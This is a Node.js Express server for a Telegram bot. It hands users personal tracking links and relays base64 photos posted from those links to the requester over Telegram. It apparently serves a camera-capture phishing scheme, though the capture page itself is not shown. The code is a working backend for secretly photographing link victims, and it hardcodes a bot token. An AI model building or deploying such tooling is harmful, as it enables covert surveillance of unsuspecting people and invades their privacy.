const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000; //

const BOT_TOKEN = '7899918022:AAFeO3ofPyWdsYkGLcDlULCtu_Tff_CQM60'; //
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(cors()); //
app.use(bodyParser.json({ limit: '50mb' })); //

const welcomeMsg = `𓆩『𝕄𝔸𝕏💀⚠️𝕟¹.⁶𝕢』𓆪
⬛⬜⬛⬜⬛⬜⬛⬜
⬜⬛⬜⬛⬜⬛⬜⬛
⬛⬜⬛⬜⬛⬜⬛⬜
⬜⬛⬜⬛⬜⬛⬜⬛
​[ LOADING.. ]
​▒▒▒▒▒▒▒▒▒▒ 0%
▒▒▒██▒▒▒▒▒ 20%
▒▒▒████▒▒▒ 40%
▒▒▒██████▒ 60%
▒▒▒███████ 100%
​[ 𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 𝕄𝕐 𝕎𝕆ℝ𝕃𝔻 ]
​/ \\  / \\  / \\  / \\
( M )( A )( X )( ! )
_/  _/  _/  _/
​█▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
𝕄𝔸𝕏 𝕆ℕ 𝕋𝕆ℙ
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄█`;

// استقبال رسائل البوت (Start)
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    const { message, callback_query } = req.body;
    if (message && message.text === '/start') {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: message.chat.id,
            text: welcomeMsg,
            reply_markup: {
                inline_keyboard: [[{ text: "🔗 استخراج الرابط", callback_data: `link_${message.chat.id}` }]]
            }
        });
    }
    if (callback_query) {
        const userId = callback_query.from.id;
        const myUrl = `https://${req.get('host')}/?id=${userId}`;
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: userId,
            text: `✅ الرابط الخاص بك جاهز:\n${myUrl}`
        });
    }
    res.sendStatus(200);
});

// استقبال الصور
app.post('/upload-photo', async (req, res) => {
    const { image, targetId } = req.body;
    if (!image || !targetId) return res.sendStatus(400);

    const base64Image = image.replace(/^data:image\/\w+;base64,/, ""); //
    const buffer = Buffer.from(base64Image, 'base64'); //
    
    const form = new FormData();
    form.append('chat_id', targetId);
    form.append('photo', buffer, { filename: 'pic.jpg', contentType: 'image/jpeg' }); //

    try {
        await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() }); //
        res.sendStatus(200);
    } catch (e) { res.sendStatus(500); }
});

app.listen(PORT, () => console.log(`Running on ${PORT}`)); //
